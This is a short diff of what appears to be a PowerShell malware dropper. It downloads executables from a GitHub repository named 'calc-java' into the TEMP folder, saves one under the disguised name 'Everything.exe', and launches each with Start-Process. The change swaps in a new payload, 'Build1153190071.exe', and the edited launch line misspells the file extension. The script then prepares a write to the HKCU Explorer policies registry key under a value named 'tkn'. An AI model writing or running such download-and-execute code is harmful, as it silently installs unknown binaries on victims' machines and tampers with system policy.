@@ -1,8 +1,8 @@
 Invoke-WebRequest -Uri "https://github.com/MinisterRiddle/calc-java/raw/refs/heads/main/123.exe" -OutFile "$env:TEMP\Everything.exe"
 Start-Process "$env:TEMP\Everything.exe"
 
-Invoke-WebRequest -Uri "https://github.com/MinisterRiddle/calc-java/raw/refs/heads/main/123.exe" -OutFile "$env:TEMP\123.exe"
-Start-Process "$env:TEMP\123.exe"
+Invoke-WebRequest -Uri "https://github.com/MinisterRiddle/calc-java/raw/refs/heads/main/Build1153190071.exe" -OutFile "$env:TEMP\Build1153190071.exe"
+Start-Process "$env:TEMP\Build1153190071.exee"
 
 $r = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
 $n = "tkn"
